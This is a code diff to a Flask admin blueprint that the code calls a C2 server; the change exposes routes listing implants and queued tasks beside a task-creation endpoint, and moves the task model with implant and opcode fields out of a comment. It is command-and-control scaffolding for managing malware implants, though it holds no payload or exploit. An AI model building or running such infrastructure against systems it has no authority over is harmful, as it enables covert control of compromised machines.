@@ -4,28 +4,23 @@ from flask import Blueprint, request, jsonify
 from database import db 
 from models import * 
 
-
 admin = Blueprint("admin", __name__)
 
-# home route that returns below text when root url is accessed
-@admin.route("/")
-def hello_world():
-   return "<p>Hello, World! This is a test for admin??</p>"
-
-'''
 @admin.route("/admin/hello")
 def admin_hello():
-    return "hello world admin "
+    return "Hello my dearest admin, welcome to le C2's cousin Rebecca."
 
-''
-class Task(db.Model):
-    id =  db.Column(db.Integer, primary_key = True)
-    task_id = db.Column(db.String)
-    status = db.Column(db.String)
-    implant_guid = db.Column(db.String)
-    task_opcode = db.Column(db.Integer)
-    task_args = db.Column(db.String)
-''   
+@admin.route("/implant/list")
+def admin_list_implants():
+    with  db.session() as session:
+        tasks = list(session.query(Implant).all())    
+    return jsonify(tasks)
+
+@admin.route("/task/list")
+def admin_list_tasks():
+    with  db.session() as session:
+        tasks = list(session.query(Task).all())    
+    return jsonify(tasks)
 
 @admin.route("/task/create", methods = ["POST"])
 def rpc_create_task():
@@ -53,21 +48,6 @@ def rpc_create_task():
         return jsonify([])
 
     return jsonify( {"status": "ok", "task_id": task.task_id })
-
-
-@admin.route("/task/list")
-def admin_list_tasks():
-    with  db.session() as session:
-        tasks = list(session.query(Task).all())    
-    return jsonify(tasks)
-
-
-@admin.route("/implant/list")
-def admin_list_implants():
-    with  db.session() as session:
-        tasks = list(session.query(Implant).all())    
-    return jsonify(tasks)
-'''
 
 
 
